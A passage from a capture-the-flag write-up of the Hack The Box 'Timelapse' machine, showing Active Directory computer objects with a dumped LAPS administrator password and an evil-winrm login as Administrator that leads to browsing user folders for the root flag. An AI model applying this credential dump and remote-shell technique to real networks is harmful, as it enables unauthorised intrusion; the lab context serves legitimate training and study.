DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                 : dc01.timelapse.htb
Enabled                     : True
ms-Mcs-AdmPwd               : {c8/;-8W6Si[r87qyj@FG26M
ms-Mcs-AdmPwdExpirationTime : 132952370720148803
Name                        : DC01
ObjectClass                 : computer
ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName              : DC01$
SID                         : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName           :

PSComputerName    : localhost
RunspaceId        : d416ee51-82f0-43f4-89ec-99b3d038a162
DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : DB01
ObjectClass       : computer
ObjectGUID        : d38b3265-230f-47ae-bdcd-f7153da7659d
SamAccountName    : DB01$
SID               : S-1-5-21-671920749-559770252-3318990721-1606
UserPrincipalName :

PSComputerName    : localhost
RunspaceId        : d416ee51-82f0-43f4-89ec-99b3d038a162
DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : WEB01
ObjectClass       : computer
ObjectGUID        : 897c7cfe-ba15-4181-8f2c-a74f88952683
SamAccountName    : WEB01$
SID               : S-1-5-21-671920749-559770252-3318990721-1607
UserPrincipalName :

PSComputerName    : localhost
RunspaceId        : d416ee51-82f0-43f4-89ec-99b3d038a162
DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : DEV01
ObjectClass       : computer
ObjectGUID        : 02dc961a-7a60-4ec0-a151-0472768814ca
SamAccountName    : DEV01$
SID               : S-1-5-21-671920749-559770252-3318990721-1608
UserPrincipalName :

```
### Privledge Escalation with Evil-WINRM

```console
noob2uub@kali:~/Documents/HTB/Timelapse$ evil-winrm -S -i 10.10.11.152 -u Administrator {c8/;-8W6Si[r87qyj@FG26M 
Enter Password: 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
```
So I am now in Administrator so just have to find the root flag. 

After hunting around for a while, I decided to look in other User folders and found TRX. 

```console
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX


*Evil-WinRM* PS C:\Users> cd TRX
*Evil-WinRM* PS C:\Users\TRX> cd Desktop
*Evil-WinRM* PS C:\Users\TRX\Desktop> ls


    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/18/2022   6:24 PM             34 root.txt
```

